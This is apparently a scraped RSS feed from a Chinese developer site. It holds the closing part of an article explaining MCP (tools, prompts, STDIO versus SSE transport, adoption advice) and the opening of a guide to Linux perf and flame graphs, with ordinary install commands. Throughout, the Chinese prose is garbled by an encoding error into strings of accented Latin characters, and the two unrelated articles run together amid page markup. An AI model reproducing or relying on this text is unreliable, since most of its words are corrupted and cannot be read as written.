<p><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼š"å¸®æˆ‘æŸ¥åŒ—äº¬çš„å¤©æ°”" â†’ AI è°ƒç”¨å¤©æ°”æŸ¥è¯¢å·¥å…·ï¼ˆToolï¼‰â†’ è¿”å›å®æ—¶å¤©æ°”æ•°æ®</p>
<hr/>
<h4 data-id="heading-18">ğŸ’¬ Promptsï¼ˆæç¤ºè¯æ¨¡æ¿ï¼‰â€”â€” æ ‡å‡†åŒ–çš„å·¥ä½œæµ</h4>
<p><strong>ç®€å•è¯´</strong>ï¼šé¢„å®šä¹‰çš„å¯¹è¯æ¨¡æ¿ï¼Œç”¨æˆ·ä¸€é”®è§¦å‘å¸¸è§ä»»åŠ¡ã€‚</p>
<p><strong>å¸¸è§ä¾‹å­</strong>ï¼š</p>
<ul>
<li>"ä»£ç å®¡æŸ¥"ï¼šè‡ªåŠ¨åˆ†ææ€§èƒ½ã€å®‰å…¨ã€å¯è¯»æ€§</li>
<li>"ç”Ÿæˆæ–‡æ¡£"ï¼šæ ¹æ®ä»£ç è‡ªåŠ¨ç”Ÿæˆ README</li>
<li>"Bug è¯Šæ–­"ï¼šç³»ç»ŸåŒ–æ’æŸ¥é—®é¢˜</li>
</ul>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼šç”¨æˆ·é€‰æ‹©"ä»£ç å®¡æŸ¥"æ¨¡æ¿ â†’ è‡ªåŠ¨å¡«å……ä»£ç  â†’ AI æŒ‰æ¨¡æ¿æ‰§è¡Œå®¡æŸ¥æµç¨‹</p>
<hr/>
<p><strong>ä¸€å¥è¯åŒºåˆ†</strong>ï¼š</p>

























<table><thead><tr><th>æ¦‚å¿µ</th><th>ä¸€å¥è¯è¯´æ˜</th><th>æœ€å¸¸è§ç”¨é€”</th></tr></thead><tbody><tr><td><strong>Resources</strong></td><td>AI è¯»å–çš„æ•°æ®</td><td>è¯»å–æ–‡ä»¶ã€æŸ¥è¯¢æ•°æ®åº“</td></tr><tr><td><strong>Tools</strong></td><td>AI æ‰§è¡Œçš„æ“ä½œ</td><td><strong>è°ƒç”¨å¤–éƒ¨ API</strong>ï¼ˆæœ€å¸¸ç”¨ï¼‰</td></tr><tr><td><strong>Prompts</strong></td><td>ç”¨æˆ·è§¦å‘çš„æ¨¡æ¿</td><td>æ ‡å‡†åŒ–å·¥ä½œæµ</td></tr></tbody></table>
<blockquote>
<p>ğŸ’¡ <strong>Tip</strong>ï¼šå®é™…ä½¿ç”¨ä¸­ <strong>Tools å  90%</strong>ï¼ŒResources é€‚åˆéœ€è¦å¤§é‡ä¸Šä¸‹æ–‡çš„åœºæ™¯ï¼ŒPrompts ç”¨äºå›ºå®šæµç¨‹ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-19">2.3 MCP çš„ä¼ è¾“æ–¹å¼</h3>
<p>MCP æ”¯æŒä¸¤ç§ä¸»æµä¼ è¾“æ–¹å¼ï¼ˆè¿˜æœ‰ç¬¬ä¸‰ç§ Streamable HTTPï¼Œä½†è¾ƒå°‘ç”¨ï¼‰ï¼Œç†è§£å®ƒä»¬åªéœ€è®°ä½ï¼š<strong>æœ¬åœ°è¿˜æ˜¯è¿œç¨‹</strong>ã€‚</p>
<h4 data-id="heading-20">æ–¹å¼ 1ï¼šSTDIO â€”â€” æœ¬åœ°è¿›ç¨‹é€šä¿¡</h4>
<p><strong>ç®€å•è¯´</strong>ï¼šCursor å¯åŠ¨ä¸€ä¸ªæœ¬åœ°ç¨‹åºï¼ˆå¦‚ Node.js è„šæœ¬ï¼‰ï¼Œé€šè¿‡æ ‡å‡†è¾“å…¥è¾“å‡ºé€šä¿¡ã€‚</p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿæ“ä½œï¼ˆè¯»å†™æ–‡ä»¶ã€æœç´¢ä»£ç ï¼‰</li>
<li>æœ¬åœ°æ•°æ®åº“æŸ¥è¯¢ï¼ˆSQLiteã€æœ¬åœ° MySQLï¼‰</li>
<li>å¼€å‘å’Œè°ƒè¯•è‡ªå·±çš„ MCP Server</li>
</ul>
<p><strong>ä¼˜ç‚¹</strong>ï¼šå¿«ã€å®‰å…¨ã€ä¸éœ€è¦ç½‘ç»œ<br/>
<strong>ç¼ºç‚¹</strong>ï¼šåªèƒ½æœ¬åœ°ç”¨ï¼Œéœ€è¦å®‰è£…ä¾èµ–</p>
<p><strong>å…¸å‹é…ç½®</strong>ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"/path/to/mcp-server.js"</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h4 data-id="heading-21">æ–¹å¼ 2ï¼šSSE â€”â€” è¿œç¨‹ HTTP æœåŠ¡</h4>
<p><strong>ç®€å•è¯´</strong>ï¼šCursor é€šè¿‡ç½‘ç»œè®¿é—®è¿œç¨‹æœåŠ¡å™¨ï¼ˆå¦‚é«˜å¾·åœ°å›¾çš„äº‘ç«¯ APIï¼‰ã€‚</p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>ç¬¬ä¸‰æ–¹æœåŠ¡ï¼ˆåœ°å›¾ã€å¤©æ°”ã€ç¿»è¯‘ï¼‰</li>
<li>ä¼ä¸šå†…éƒ¨ APIï¼ˆç»Ÿä¸€éƒ¨ç½²çš„å·¥å…·ï¼‰</li>
<li>ç”Ÿäº§ç¯å¢ƒï¼ˆå¤šäººå…±äº«åŒä¸€ä¸ªæœåŠ¡ï¼‰</li>
</ul>
<p><strong>ä¼˜ç‚¹</strong>ï¼šå…å®‰è£…ã€å¯å…±äº«ã€æ˜“æ›´æ–°<br/>
<strong>ç¼ºç‚¹</strong>ï¼šéœ€è¦ç½‘ç»œï¼Œæœ‰å»¶è¿Ÿ</p>
<p><strong>å…¸å‹é…ç½®</strong>ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://mcp.example.com/sse?key=your_key"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<p><strong>å¦‚ä½•é€‰æ‹©ï¼Ÿ</strong></p>






























<table><thead><tr><th>ä½ çš„éœ€æ±‚</th><th>æ¨èæ–¹å¼</th><th>å…¸å‹ä¾‹å­</th></tr></thead><tbody><tr><td>è¯»å†™æœ¬åœ°æ–‡ä»¶</td><td>STDIO</td><td>æ–‡ä»¶æœç´¢ã€ä»£ç åˆ†æ</td></tr><tr><td>æŸ¥è¯¢æœ¬åœ°æ•°æ®åº“</td><td>STDIO</td><td>SQLiteã€æœ¬åœ° PostgreSQL</td></tr><tr><td>è°ƒç”¨ç¬¬ä¸‰æ–¹ API</td><td>SSE</td><td>é«˜å¾·åœ°å›¾ã€å¤©æ°”æœåŠ¡</td></tr><tr><td>å›¢é˜Ÿå…±äº«å·¥å…·</td><td>SSE</td><td>ä¼ä¸šå†…éƒ¨ APIã€ç»Ÿä¸€è®¤è¯</td></tr></tbody></table>
<blockquote>
<p>ğŸ’¡ <strong>Tip</strong>ï¼šè®°ä½ä¸€å¥è¯ï¼š<strong>æœ¬åœ°ç”¨ STDIOï¼Œè¿œç¨‹ç”¨ SSE</strong>ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-22">å†™åœ¨æœ€åï¼šçœ‹æ‡‚æœ¬è´¨ï¼Œå°‘è¸©å‘</h2>
<p>è¯»åˆ°è¿™é‡Œï¼Œä½ åº”è¯¥å·²ç»æ˜ç™½ï¼š</p>
<p><strong>MCP ä¸æ˜¯ä»€ä¹ˆé»‘ç§‘æŠ€</strong>ï¼Œå®ƒå°±æ˜¯æŠŠ Function Call åŒ…äº†ä¸€å±‚æ ‡å‡†åŒ–åè®®ã€‚<br/>
<strong>MCP ä¸ä¼šè®© AI å˜èªæ˜</strong>ï¼Œè¯¥é€‰é”™å·¥å…·è¿˜æ˜¯ä¼šé€‰é”™ï¼Œè¯¥æå–é”™å‚æ•°è¿˜æ˜¯ä¼šæå–é”™ã€‚<br/>
<strong>MCP ä¹Ÿä¸æ˜¯å…è´¹åˆé¤</strong>ï¼ŒAPI è°ƒç”¨æˆæœ¬è¯¥è°ä»˜è¿˜æ˜¯è°ä»˜ã€‚</p>
<p>é‚£ä¸ºä»€ä¹ˆè¿˜è¦äº†è§£ MCPï¼Ÿ</p>
<p>å› ä¸ºå®ƒä»£è¡¨äº†ä¸€ä¸ªè¶‹åŠ¿ï¼š<strong>AI å·¥å…·ç”Ÿæ€çš„æ ‡å‡†åŒ–</strong>ã€‚å°±åƒå½“å¹´çš„ USB æ ‡å‡†ï¼Œè™½ç„¶æŠ€æœ¯ä¸Šæ²¡ä»€ä¹ˆåˆ›æ–°ï¼Œä½†ç»Ÿä¸€äº†æ¥å£ï¼Œè®©æ•´ä¸ªç”Ÿæ€ç¹è£èµ·æ¥ã€‚</p>
<hr/>
<h3 data-id="heading-23">ç»™ä½ ä¸‰ä¸ªå»ºè®®</h3>
<p><strong>1. ä¸è¦ç›²ç›®è¿½æ–°</strong></p>
<p>çœ‹åˆ° MCP ç«äº†å°±è§‰å¾—å¿…é¡»ç”¨ï¼Œè¿™æ˜¯æœ€å¤§çš„è¯¯åŒºã€‚å¦‚æœä½ çš„é¡¹ç›®ï¼š</p>
<ul>
<li>å·¥å…·å°±å‡ ä¸ªï¼Œéƒ½æ˜¯è‡ªå·±çš„ API</li>
<li>ä¸€ä¸ªäººå¼€å‘ï¼Œä¸éœ€è¦å›¢é˜Ÿåä½œ</li>
<li>å¯¹å·¥å…·è°ƒç”¨æœ‰æ·±åº¦å®šåˆ¶éœ€æ±‚</li>
</ul>
<p>é‚£è‡ªå·±å®ç° Function Call å¯èƒ½æ›´åˆé€‚ï¼ŒæŒæ§åŠ›æ›´å¼ºï¼Œè°ƒè¯•ä¹Ÿæ›´æ–¹ä¾¿ã€‚</p>
<hr/>
<p><strong>2. ä¹Ÿä¸è¦ä¸€æ£å­æ‰“æ­»</strong></p>
<p>å¦‚æœä½ éœ€è¦å¿«é€Ÿæ¥å…¥ï¼š</p>
<ul>
<li>é«˜å¾·åœ°å›¾ã€ç™¾åº¦åœ°å›¾è¿™ç±»ç°æˆæœåŠ¡</li>
<li>å›¢é˜Ÿå…±äº«çš„æ ‡å‡†åŒ–å·¥å…·</li>
<li>å¼€æºç¤¾åŒºæä¾›çš„ MCP Server</li>
</ul>
<p>é‚£ MCP èƒ½å¸®ä½ çœä¸å°‘äº‹ï¼Œä¸ç”¨ç ”ç©¶æ¯ä¸ª API çš„æ–‡æ¡£ï¼Œè£…ä¸Šå°±èƒ½ç”¨ã€‚</p>
<hr/>
<p><strong>3. æ··åˆç­–ç•¥æœ€åŠ¡å®</strong></p>
<p><strong>æ ¸å¿ƒä¸šåŠ¡é€»è¾‘è‡ªå·±æŒæ§ï¼Œé€šç”¨èƒ½åŠ›ç”¨ MCP å¿«é€Ÿæ¥å…¥</strong>ã€‚</p>
<p>æ¯”å¦‚ä½ åšä¸€ä¸ªæ™ºèƒ½å®¢æœï¼š</p>
<ul>
<li>æŸ¥è®¢å•ã€æŸ¥åº“å­˜ â†’ è‡ªå·±å®ç°ï¼ˆæ ¸å¿ƒä¸šåŠ¡ï¼‰</li>
<li>åœ°å›¾å¯¼èˆªã€å¤©æ°”æŸ¥è¯¢ â†’ ç”¨ MCPï¼ˆé€šç”¨èƒ½åŠ›ï¼‰</li>
<li>å‘é‚®ä»¶ã€å‘çŸ­ä¿¡ â†’ ç”¨ MCPï¼ˆæ ‡å‡†åŒ–æ“ä½œï¼‰</li>
</ul>
<p>è¿™æ ·æ—¢èƒ½ä¿è¯æ ¸å¿ƒç«äº‰åŠ›ï¼Œåˆèƒ½äº«å—ç”Ÿæ€çº¢åˆ©ã€‚</p>
<hr/>
<h3 data-id="heading-24">æœ€åä¸€å¥è¯</h3>
<p><strong>MCP æ˜¯ä¸ªå¥½åè®®ï¼Œä½†ä¸è¦ç¥åŒ–å®ƒã€‚</strong></p>
<p>æŠ€æœ¯æ°¸è¿œæ˜¯ä¸ºä¸šåŠ¡æœåŠ¡çš„ã€‚ç†è§£å®ƒçš„æœ¬è´¨ï¼Œçœ‹æ¸…å®ƒçš„è¾¹ç•Œï¼Œåœ¨åˆé€‚çš„åœºæ™¯ç”¨å¥½å®ƒâ€”â€”è¿™æ‰æ˜¯å·¥ç¨‹å¸ˆè¯¥æœ‰çš„æ€åº¦ã€‚</p>
<p>å°±åƒä½ ä¸ä¼šå› ä¸º USB å‡ºç°äº†ï¼Œå°±æŠŠæ‰€æœ‰è®¾å¤‡éƒ½æ¢æˆ USB æ¥å£ã€‚æœ‰äº›åœºæ™¯è¯¥ç”¨é›·ç”µå£è¿˜å¾—ç”¨é›·ç”µå£ï¼Œæœ‰äº›åœºæ™¯å¹²è„†ç›´æ¥ç„Šçº¿æ›´å¯é ã€‚</p>
<p><strong>å·¥å…·æ˜¯æ­»çš„ï¼Œäººæ˜¯æ´»çš„ã€‚åˆ«è®©å·¥å…·æ¡†ä½äº†æ€ç»´ã€‚</strong></p>
<p>ä¸‹ç¯‡æˆ‘ä»¬èŠå®æˆ˜ï¼šå¦‚ä½•åœ¨ Cursor ä¸­é…ç½® MCPï¼Œæ‰‹æŠŠæ‰‹æ¥å…¥é«˜å¾·åœ°å›¾ï¼Œè®©ä½ çš„ AI åŠ©æ‰‹çœŸæ­£"åŠ¨"èµ·æ¥ã€‚</p>
<hr/>
<h2 data-id="heading-25">å‚è€ƒèµ„æ–™</h2>
<p>ğŸ“– <strong>å®˜æ–¹æ–‡æ¡£</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io" target="_blank" title="https://modelcontextprotocol.io" ref="nofollow noopener noreferrer">Anthropic MCP åè®®è§„èŒƒ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcursor.com%2Fcn%2Fdocs%2Fcontext%2Fmcp" target="_blank" title="https://cursor.com/cn/docs/context/mcp" ref="nofollow noopener noreferrer">Cursor MCP æ–‡æ¡£</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Perf å·¥å…·ä¸ç«ç„°å›¾ä½¿ç”¨æŒ‡å—]]></title>    <link>https://juejin.cn/post/7581698074361135113</link>    <guid>https://juejin.cn/post/7581698074361135113</guid>    <pubDate>2025-12-09T10:23:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581698074361135113" data-draft-id="7581666412021317641" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Perf å·¥å…·ä¸ç«ç„°å›¾ä½¿ç”¨æŒ‡å—"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-09T10:23:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Mr_lai"/> <meta itemprop="url" content="https://juejin.cn/user/905653310994535"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Perf å·¥å…·ä¸ç«ç„°å›¾ä½¿ç”¨æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/905653310994535/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Mr_lai
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T10:23:05.000Z" title="Tue Dec 09 2025 10:23:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Perf å·¥å…·ä¸ç«ç„°å›¾ä½¿ç”¨æŒ‡å—</h2>
<blockquote>
<p><strong>å‚è€ƒèµ„æ–™</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.brendangregg.com%2Fflamegraphs.html" target="_blank" title="https://www.brendangregg.com/flamegraphs.html" ref="nofollow noopener noreferrer">Brendan Gregg's Flame Graphs</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbrendangregg%2FFlameGraph%2Fblob%2Fmaster%2FREADME.md" target="_blank" title="https://github.com/brendangregg/FlameGraph/blob/master/README.md" ref="nofollow noopener noreferrer">FlameGraph GitHub</a></li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-1">ç›®å½•</h3>
<ul>
<li><a href="#%E4%B8%80perf-%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D" title="#%E4%B8%80perf-%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D">ä¸€ã€Perf å·¥å…·ä»‹ç»</a></li>
<li><a href="#%E4%BA%8Cperf-%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F" title="#%E4%BA%8Cperf-%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F">äºŒã€Perf å·¥ä½œæ¨¡å¼</a></li>
<li><a href="#%E4%B8%89perf-%E5%AE%89%E8%A3%85" title="#%E4%B8%89perf-%E5%AE%89%E8%A3%85">ä¸‰ã€Perf å®‰è£…</a></li>
<li><a href="#%E5%9B%9Bperf-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95" title="#%E5%9B%9Bperf-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95">å››ã€Perf ä½¿ç”¨æ–¹æ³•</a></li>
<li><a href="#%E4%BA%94%E7%94%9F%E6%88%90%E7%81%AB%E7%84%B0%E5%9B%BE" title="#%E4%BA%94%E7%94%9F%E6%88%90%E7%81%AB%E7%84%B0%E5%9B%BE">äº”ã€ç”Ÿæˆç«ç„°å›¾</a></li>
</ul>
<hr/>
<h3 data-id="heading-2">ä¸€ã€Perf å·¥å…·ä»‹ç»</h3>
<p><code>perf</code> å‘½ä»¤ï¼ˆperformance çš„ç¼©å†™ï¼‰ï¼Œæ˜¯ <a href="https://link.juejin.cn?target=https%3A%2F%2Fso.csdn.net%2Fso%2Fsearch%3Fq%3DLinux%26spm%3D1001.2101.3001.7020" target="_blank" title="https://so.csdn.net/so/search?q=Linux&amp;spm=1001.2101.3001.7020" ref="nofollow noopener noreferrer">Linux</a> ç³»ç»Ÿæä¾›çš„æ€§èƒ½åˆ†æå·¥å…·é›†ï¼ŒåŒ…å«å¤šç§å­å·¥å…·ï¼Œèƒ½å¤Ÿç›‘æµ‹å¤šç§ç¡¬ä»¶åŠè½¯ä»¶æ€§èƒ½æŒ‡æ ‡ï¼ŒåŒ…æ‹¬ CPUã€å†…å­˜ã€IO ç­‰ï¼Œè¿™äº›å¯ç›‘æµ‹æŒ‡æ ‡æˆ‘ä»¬ç§°ä¸º <strong>Event</strong>ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[Perf å·¥å…·] --&gt; B[Hardware Event]
    A --&gt; C[Software Event]
    A --&gt; D[Tracepoint Event]
    B --&gt; B1[CPU å‘¨æœŸ]
    B --&gt; B2[Cache ç¼ºå¤±]
    B --&gt; B3[åˆ†æ”¯é¢„æµ‹]
    C --&gt; C1[ä¸Šä¸‹æ–‡åˆ‡æ¢]
    C --&gt; C2[ç¼ºé¡µå¼‚å¸¸]
    C --&gt; C3[ç³»ç»Ÿè°ƒç”¨]
    D --&gt; D1[å†…æ ¸è·Ÿè¸ªç‚¹]
    D --&gt; D2[Slab åˆ†é…]
</code></pre>
<hr/>
<h3 data-id="heading-3">äºŒã€Perf å·¥ä½œæ¨¡å¼</h3>
<h4 data-id="heading-4">2.1 è®¡æ•°æ¨¡å¼</h4>
<p>è®°å½• perf æ‰§è¡Œè¿‡ç¨‹ä¸­ event çš„å‡ºç°æ¬¡æ•°ã€‚</p>
<h4 data-id="heading-5">2.2 é‡‡æ ·æ¨¡å¼</h4>
<p>åœ¨ perf æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼ŒæŒ‰ç…§æŒ‡å®šé¢‘ç‡å»é‡‡æ · eventï¼Œæ¯æ¬¡é‡‡æ ·æ—¶ï¼Œè®°å½•å½“å‰æ€§èƒ½æŒ‡æ ‡ä¿¡æ¯ï¼ˆCPUã€è¿›ç¨‹ IDã€è¿è¡Œæ ˆç­‰ï¼‰ã€‚</p>
<blockquote>
<p>âš ï¸ <strong>æ³¨æ„</strong>ï¼šè¿™ç§æ–¹å¼ç”±äºæ¯æ¬¡éƒ½è®°å½•ä¿¡æ¯ï¼Œæ‰€ä»¥é¢å¤–çš„èµ„æºæ¶ˆè€—æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œéœ€è¦æƒè¡¡é‡‡æ ·é¢‘ç‡ã€‚</p>
</blockquote>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph è®¡æ•°æ¨¡å¼
        A1[å¼€å§‹ç›‘æ§] --&gt; A2[ç»Ÿè®¡ Event æ¬¡æ•°] --&gt; A3[è¾“å‡ºç»Ÿè®¡ç»“æœ]
    end
    subgraph é‡‡æ ·æ¨¡å¼
        B1[å¼€å§‹ç›‘æ§] --&gt; B2[æŒ‰é¢‘ç‡é‡‡æ ·] --&gt; B3[è®°å½•è¯¦ç»†ä¿¡æ¯] --&gt; B4[ç”Ÿæˆæ•°æ®æ–‡ä»¶]
    end
</code></pre>
<hr/>
<h3 data-id="heading-6">ä¸‰ã€Perf å®‰è£…</h3>
<h4 data-id="heading-7">3.1 é€šè¿‡åŒ…ç®¡ç†å™¨å®‰è£…ï¼ˆUbuntuï¼‰</h4>
<p>å¯¹äº Ubuntu ç­‰ Linux ç³»ç»Ÿå‘è¡Œç‰ˆï¼Œéƒ½æä¾›äº†å¯¹åº”çš„åŒ…ï¼Œåªè¦æ ¹æ®å†…æ ¸ç‰ˆæœ¬è¿›è¡Œå®‰è£…å³å¯ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åœ¨ Ubuntu ä¸‹å®‰è£…</span>
sudo apt-get install linux-tools-common
sudo apt-get install linux-tools-<span class="hljs-string">"<span class="hljs-subst">$(uname -r)</span>"</span>
sudo apt-get install linux-cloud-tools-<span class="hljs-string">"<span class="hljs-subst">$(uname -r)</span>"</span>
sudo apt-get install linux-tools-generic
sudo apt-get install linux-cloud-tools-generic
</code></pre>
<blockquote>
<p>ğŸ’¡ <strong>æç¤º</strong>ï¼šLinux ç³»ç»Ÿå¯èƒ½æ— æ³•æ‰¾åˆ°å’Œ kernel ç‰ˆæœ¬ç›¸åŒçš„å·¥å…·å®‰è£…åŒ…ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–ç‰ˆæœ¬æ›¿æ¢ã€‚</p>
</blockquote>
<p>å¦‚æœç‰ˆæœ¬ä¸åŒ¹é…ï¼Œå¯ä»¥æ‰‹åŠ¨åˆ›å»ºè½¯é“¾æ¥ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">sudo <span class="hljs-built_in">rm</span> /usr/bin/perf
sudo <span class="hljs-built_in">ln</span> -s /usr/lib/linux-tools-4.15.0-163/perf /usr/local/bin/perf
</code></pre>
<h4 data-id="heading-8">3.2 ä»æºç ç¼–è¯‘å®‰è£…ï¼ˆæ¨èï¼‰</h4>
<blockquote>
